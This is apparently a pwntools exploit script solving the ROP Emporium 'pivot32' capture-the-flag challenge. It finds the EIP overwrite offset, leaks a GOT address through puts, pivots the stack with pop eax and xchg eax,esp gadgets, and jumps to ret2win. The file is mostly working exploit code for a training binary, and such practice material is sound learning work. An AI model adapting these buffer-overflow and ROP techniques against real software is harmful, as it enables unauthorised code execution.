'''
Cool debugging trick: injecting: p32(0x90cc9090) and then: print hex(p.corefile.eip) to see if it's there
'''

from pwn import *

# context(arch="i386", os="linux")

elf = ELF("./pivot32", checksec=False)
p = elf.process()
# context.log_level = 'debug'

# Finding eip-offset
p.sendafter("> ", " ")
p.sendafter("> ", cyclic(512))
p.wait()
eip_offset = cyclic_find(p.corefile.eip)	# eip_offset = 44
print eip_offset

# ------------------------------------------------------------------------------------------

p = elf.process()							# reinitializing the process

foot_plt = elf.plt['foothold_function']
foot_got = elf.got['foothold_function']
puts_plt = elf.plt['puts']
main_ptr = elf.symbols['main']

# Offsets - found with: $ readelf -s libpivot32.so
foot_offset = 0x77d
ret2win_offset = 0x974



		# Parsing pivot address

p.recvuntil("pivot: ")
pvt_addr = int(p.recv(10), 16) 		# 0xf7___f10
log.info('[!] Pivot address: {}'.format(hex(pvt_addr)))



		# Leaking foothold_function GOT address (in stack#2)

payload = p32(foot_plt) + p32(puts_plt) + p32(main_ptr) + p32(foot_got) # + p32(0x90cc9090)
p.recvuntil("> ")
p.sendline(payload)



		# Pivoting to stack#2 

pop_eax = 0x0804882c				# 0x0804882c : pop eax ; ret
xchg_eax_esp = 0x0804882e			# 0x0804882e : xchg eax, esp ; ret

payload  = "A" * eip_offset
payload += p32(pop_eax)
payload += p32(pvt_addr)
payload += p32(xchg_eax_esp)
p.recvuntil("> ")
p.sendline(payload)



		# Parsing leaked addr and calculating ret2win addr

print p.recvlines(2)
leak = p.recv()
leak = unpack(leak[:4].strip())
print hex(leak)
log.success('[!] Leaked foothold_function GOT address: {}'.format(hex(leak)))

base_addr = leak - foot_offset
ret2win_addr = base_addr + ret2win_offset
log.success('[!] ret2win address: {}'.format(hex(ret2win_addr)))

		# Calling ret2win

payload = "A" * 44 + p32(ret2win_addr)
p.sendline(payload)

p.wait()
success(p.recv())